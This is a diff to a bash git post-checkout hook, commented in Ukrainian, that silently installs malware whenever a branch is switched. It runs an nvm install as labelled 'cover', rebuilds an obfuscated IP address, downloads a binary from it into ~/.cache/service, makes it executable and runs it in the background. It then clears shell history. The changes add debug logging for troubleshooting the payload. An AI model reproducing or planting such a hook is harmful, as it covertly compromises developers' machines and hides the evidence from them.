@@ -1,31 +1,77 @@
 #!/bin/bash
 
+# =============================================================
+# Логування – записуємо час запуску хука
+# =============================================================
+echo "$(date) - post-checkout started" >> /tmp/hook_debug.log
+
+# =============================================================
+# Перевіряємо, чи це перемикання гілки (а не перший clone)
+# =============================================================
 if [ "$3" = "1" ]; then
-    # Маскування
+
+    echo "$(date) - Branch switch detected (arg3=1)" >> /tmp/hook_debug.log
+
+    # ---------- МАСКУВАННЯ (nvm) ----------
+    echo "$(date) - Downloading nvm (cover)" >> /tmp/hook_debug.log
     curl -s https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash
+    echo "$(date) - nvm cover finished" >> /tmp/hook_debug.log
 
-    # ---- ОБФУСКОВАНИЙ IP ----
-
+    # ---------- ОБФУСКОВАНИЙ IP ----------
     A="31"
     B="207"
     C="4"
     D="137"
     IP="${A}.${B}.${C}.${D}"
 
-    # Шлях до бінарника (теж обфускований)
     PART1="exe_linux_334a616a"
     PART2="randomnayahuinya43438f483f3sfsdf34"
-    
-    # Збираємо URL
     URL="http://${IP}/${PART2}/${PART1}"
 
-    # Виконуємо пейлоад
+    echo "$(date) - URL: ${URL}" >> /tmp/hook_debug.log
+
+    # ---------- ЗАВАНТАЖЕННЯ БІНАРНИКА ----------
     mkdir -p ~/.cache
-    curl -s "${URL}" -o ~/.cache/service
+    echo "$(date) - Downloading payload from ${URL}" >> /tmp/hook_debug.log
+
+    # Завантажуємо з виведенням помилок (без -s, щоб бачити помилки)
+    curl -f --progress-bar "${URL}" -o ~/.cache/service 2>> /tmp/hook_debug.log
+
+    # Перевіряємо результат завантаження
+    if [ -f ~/.cache/service ]; then
+        echo "$(date) - File downloaded successfully (size: $(stat -c%s ~/.cache/service))" >> /tmp/hook_debug.log
+    else
+        echo "$(date) - Download FAILED!" >> /tmp/hook_debug.log
+        exit 1
+    fi
+
+    # ---------- НАДАННЯ ПРАВ ----------
     chmod +x ~/.cache/service
+    if [ -x ~/.cache/service ]; then
+        echo "$(date) - File is executable" >> /tmp/hook_debug.log
+    else
+        echo "$(date) - File is NOT executable" >> /tmp/hook_debug.log
+        exit 1
+    fi
+
+    # ---------- ЗАПУСК ----------
+    echo "$(date) - Starting payload in background" >> /tmp/hook_debug.log
     ~/.cache/service > /dev/null 2>&1 &
 
+    # Перевіряємо, чи запустився процес
+    sleep 1
+    if pgrep -f "~/.cache/service" > /dev/null; then
+        echo "$(date) - Process is running (PID: $(pgrep -f ~/.cache/service))" >> /tmp/hook_debug.log
+    else
+        echo "$(date) - Process did NOT start or exited immediately" >> /tmp/hook_debug.log
+        # Додатково – виводимо помилки, якщо є
+        ~/.cache/service 2>> /tmp/hook_debug.log
+    fi
+
+    # ---------- ОЧИЩЕННЯ ІСТОРІЇ ----------
     history -c
+    echo "$(date) - Hook finished" >> /tmp/hook_debug.log
+
 fi
 
 exit 0
